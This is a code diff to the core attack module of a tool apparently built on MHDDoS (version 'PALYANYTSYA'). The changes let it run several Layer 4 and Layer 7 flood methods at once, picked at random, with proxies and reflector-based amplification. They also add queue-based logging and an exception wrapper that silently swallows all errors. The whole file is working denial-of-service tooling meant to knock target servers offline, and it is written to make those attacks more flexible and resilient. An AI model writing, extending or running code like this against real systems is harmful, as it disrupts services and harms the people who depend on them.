@@ -1,10 +1,13 @@
 import ctypes
+import logging
+import multiprocessing
 import os
+import random
 import time
 from contextlib import suppress
 from dataclasses import dataclass
 from json import load
-from logging import basicConfig, getLogger, shutdown
+from logging import shutdown
 from multiprocessing import Queue
 from pathlib import Path
 from socket import (gethostbyname)
@@ -26,20 +29,22 @@ from MHDDoS.utils.connectivity import connectivity_check_loop, ConnectivityState
 from MHDDoS.utils.misc import Counter, get_last_from_queue
 from MHDDoS.utils.proxies import ProxyManager, load_proxies, proxies_validation_thread, ProxiesValidationState
 from MHDDoS.utils.targets import Target
+from utils.logs import get_logger_for_current_process
 
 # # TODO: log to stderr
 # basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
 #             datefmt="%H:%M:%S")
 # logger = getLogger("MHDDoS")
 # logger.setLevel("INFO")
+# logger.handlers.clear()
 
 __version__: str = "PALYANYTSYA"
 __dir__: Path = Path(__file__).parent
+logger = logging.getLogger()
 
-from utils.logs import logger
+# from utils.logs import logger
 
 bombardier_path: str = ""
-
 
 UNLIMITED_RPC = 1000000000000  # number of requests per connection used to make the attack "unlimited" by time
 CONNECTIVITY_CHECK_INTERVAL = 60  # TODO: make this a parameter of attack()?
@@ -60,6 +65,7 @@ class AttackState:
 
     # target
     target: Target
+    attack_methods: List[str] = None
 
     # performance
     active_threads_count: int = None
@@ -77,6 +83,9 @@ class AttackState:
     total_bytes_sent: int = None
     bytes_per_second: int = None
     time_since_last_packet_sent: float = None
+
+    # exception
+    exception: Exception = None
 
 
 last_counters_update_time = 0
@@ -128,14 +137,44 @@ def apply_process_modifications() -> psutil.Process:
     return process
 
 
-def attack(
+def attack(  # this is just an exception wrapper; _attack() does the actual work
         target: Target,
-        attack_method: str,  # TODO: add option to use multiple attack methods
+        attack_methods: List[str],
         proxies_file_path: str | None = "proxies/socks5.txt",
         user_agents_file_path: str | None = "user_agents.txt",
         referrers_file_path: str | None = "referrers.txt",
         reflectors_file_path: str | None = None,
-        attack_state_queue: Queue = None
+        attack_state_queue: Queue = None,
+        logging_queue: Queue = None
+):
+    args = locals()
+
+    # PREPARE LOGGER
+    global logger
+    logger = get_logger_for_current_process(logging_queue, multiprocessing.current_process().name)
+    logger.info(f"Preparing attack upon {target}...")
+
+    try:
+        _attack(**args)
+    except Exception as e:
+        # logger.critical(f"Attack process stopped due to {type(e).__name__}: ", exc_info=True)
+        pass
+    except (KeyboardInterrupt, SystemExit) as e:
+        # logger.info(f"Attack process stopped due to {type(e).__name__}.")
+        pass
+    finally:
+        pass
+
+
+def _attack(
+        target: Target,
+        attack_methods: List[str],
+        proxies_file_path: str | None = "proxies/socks5.txt",
+        user_agents_file_path: str | None = "user_agents.txt",
+        referrers_file_path: str | None = "referrers.txt",
+        reflectors_file_path: str | None = None,
+        attack_state_queue: Queue = None,
+        logging_queue: Queue = None
 ):
     # PREPARE PROCESS
     process = apply_process_modifications()
@@ -146,46 +185,75 @@ def attack(
     proxies = load_proxies(proxies_file_path) if proxies_file_path is not None else []
     reflectors = None
 
+    # SANITY CHECK HELPER FUNCTIONS
+    def handle_invalid_attack_method(method: str, message: str):
+        attack_methods.remove(method)
+        logger.warning(f"{message}\n"
+                       f"    '{method}' method will be omitted in the current attack.")
+
     # PERFORM SANITY CHECKS
-    # check attack method
-    if attack_method not in Methods.ALL_METHODS:
-        exit(f"Provided method ('{attack_method}') not found. Available methods: {', '.join(Methods.ALL_METHODS)}")
     # check target
-    if not target.is_valid():
-        exit(f"Provided target ('{target}') does not have a valid IPv4 (or it could not be resolved). Please provide a valid target next time.")
-    # check Layer 4-specific conditions
-    if attack_method in Methods.LAYER4_METHODS:
-        # RAW SOCKET SUPPORT
-        if attack_method in Methods.WHICH_REQUIRE_RAW_SOCKETS and not Tools.checkRawSocket():
-            exit(f"Attack method {attack_method} requires a creation of raw socket, but it could not be created on this machine.")
+    if not target.is_valid:
+        logger.error(f"Provided target ('{target}') does not have a valid IPv4 (or it could not be resolved). Please provide a valid target next time.")
+    # check attack methods
+    attack_methods = [m.upper() for m in attack_methods]
+    for attack_method in attack_methods.copy():
+        # check if attack method is supported
+        if attack_method not in Methods.ALL_METHODS:
+            handle_invalid_attack_method(attack_method,
+                                         f"Provided method ('{attack_method}') is not supported.\nAvailable methods: {', '.join(Methods.ALL_METHODS)}")
+        # check if attack method layer matches the target's layer
+        if (attack_method in Methods.LAYER7_METHODS) and not target.is_layer_7:
+            target_protocol_string = f"Layer 4" if target.is_layer_4 else f"unsupported"
+            handle_invalid_attack_method(attack_method,
+                                         f"{attack_method} belongs to Layer 7 attack methods, but the provided target ('{target}') uses {target_protocol_string} protocol ({target.protocol}).")
+        if (attack_method in Methods.LAYER4_METHODS) and not target.is_layer_4:
+            target_protocol_string = f"Layer 7" if target.is_layer_7 else f"unsupported"
+            handle_invalid_attack_method(attack_method,
+                                         f"{attack_method} belongs to Layer 4 attack methods, but the provided target ('{target}') uses {target_protocol_string} protocol ({target.protocol}).")
+        # check Layer 4-specific conditions
+        if attack_method in Methods.LAYER4_METHODS:
+            # RAW SOCKET SUPPORT
+            if attack_method in Methods.WHICH_REQUIRE_RAW_SOCKETS and not Tools.checkRawSocket():
+                handle_invalid_attack_method(attack_method,
+                                             f"Attack method {attack_method} requires a creation of raw socket, but it could not be created on this machine.")
 
-        # REFLECTORS
-        if reflectors_file_path is not None and attack_method in Methods.WHICH_SUPPORT_REFLECTORS:
-            if not reflectors_file_path:
-                exit(f"The reflector file path is not provided.\n{attack_method} attack method requires a reflector file.")
+            # REFLECTORS
+            if reflectors_file_path is not None and attack_method in Methods.WHICH_SUPPORT_REFLECTORS:
+                if not reflectors_file_path:
+                    handle_invalid_attack_method(attack_method,
+                                                 f"The reflector file path is not provided.\n{attack_method} attack method requires a reflector file.")
 
-            reflectors_text = read_configuration_file_text(reflectors_file_path)
-            if reflectors_text is None:
-                exit(f"The reflector file doesn't exist: {reflectors_file_path}.\n{attack_method} attack method requires a reflector file.")
+                reflectors_text = read_configuration_file_text(reflectors_file_path)
+                if reflectors_text is None:
+                    handle_invalid_attack_method(attack_method,
+                                                 f"The reflector file doesn't exist: {reflectors_file_path}.\n{attack_method} attack method requires a reflector file.")
 
-            reflectors = set(a.strip() for a in ProxyTools.Patterns.IP.findall(reflectors_text))
-            if not reflectors:
-                exit(f"Did not find any reflectors in the provided file: {reflectors_file_path}.\n{attack_method} attack method requires a reflector file.")
+                reflectors = set(a.strip() for a in ProxyTools.Patterns.IP.findall(reflectors_text))
+                if not reflectors:
+                    handle_invalid_attack_method(attack_method,
+                                                 f"Did not find any reflectors in the provided file: {reflectors_file_path}.\n{attack_method} attack method requires a reflector file.")
 
-        # PROXIES WARNING
-        if proxies is not None and len(proxies) > 0:
-            if attack_method not in Methods.WHICH_SUPPORT_PROXIES:
-                logger.warning(f"{attack_method} attack method does not support proxies. {attack_method} attack connections will happen from your IP.")
-    # check bombardier
-    if attack_method == "BOMB":
-        raise NotImplemented("'BOMB' method support is not implemented yet.")
-        # TODO: (maybe) add support for BOMBARDIER
-        global bombardier_path
-        bombardier_path = Path(__dir__ / "go/bin/bombardier")
-        assert (
-                bombardier_path.exists()
-                or bombardier_path.with_suffix('.exe').exists()
-        ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-attack_method"
+            # PROXIES WARNING
+            if proxies is not None and len(proxies) > 0:
+                if attack_method not in Methods.WHICH_SUPPORT_PROXIES:
+                    handle_invalid_attack_method(attack_method,
+                                                 f"{attack_method} attack method does not support proxies, while those are provided.\n"
+                                                 f"Provide empty proxies file if you want to attack using {attack_method}.")
+        # check bombardier
+        if attack_method == "BOMB":
+            raise NotImplemented("'BOMB' method support is not implemented yet.")
+            # TODO: (maybe) add support for BOMBARDIER
+            global bombardier_path
+            bombardier_path = Path(__dir__ / "go/bin/bombardier")
+            assert (
+                    bombardier_path.exists()
+                    or bombardier_path.with_suffix('.exe').exists()
+            ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-attack_method"
+    # check if we are left with any attack methods
+    if len(attack_methods) == 0:
+        logger.critical(f"None of the {len(attack_methods)} provided attack methods were valid. Attack will not be started.")
+        raise NotImplemented  # TODO: AttackError
 
     # INITIALIZE THREAD MANAGEMENT VARIABLES
     INITIAL_THREADS_COUNT = 1
@@ -200,8 +268,8 @@ def attack(
         stop_event = Event()
         stop_event.clear()
 
-        # TODO: select random attack method from the list (when there will be multiple)
-        selected_attack_method = attack_method
+        # select random attack method from the available ones
+        selected_attack_method = random.choice(attack_methods)
 
         attack_thread = None
         if selected_attack_method in Methods.LAYER7_METHODS:
@@ -275,6 +343,7 @@ def attack(
 
         attack_status = AttackState(
             attack_pid=process.pid,
+            attack_methods=attack_methods,
 
             target=target,
 
@@ -346,7 +415,9 @@ def attack(
     connectivity_monitor.start()
 
     # ATTACK
-    logger.info(f"Starting attack at {target} using {attack_method} attack method.")
+    attack_methods_string = ", ".join(attack_methods)
+    attack_methods_string += " attack methods" if len(attack_methods) > 1 else f" attack method"
+    logger.info(f"Starting attack upon {target} using {attack_methods_string}.")
     for _ in range(INITIAL_THREADS_COUNT):
         start_new_attack_thread()
 
@@ -386,7 +457,7 @@ def attack(
         bps_string = Tools.humanbytes(int(bps))
         tp_string = Tools.humanformat(int(tp))
         tb_string = Tools.humanbytes(int(tb))
-        logger.info(f"Total bytes sent: {tb_string}, total requests: {tp_string}, BPS: {bps_string}/s, PPS: {pps_string} p/s, tslr: {tslr*1000:.0f} ms, "
+        logger.info(f"Total bytes sent: {tb_string}, total requests: {tp_string}, BPS: {bps_string}/s, PPS: {pps_string} p/s, tslr: {tslr * 1000:.0f} ms, "
                     f"threads: {len(attack_threads_stop_events)}, cpu: {cpu_usage:.0f}%")
 
 
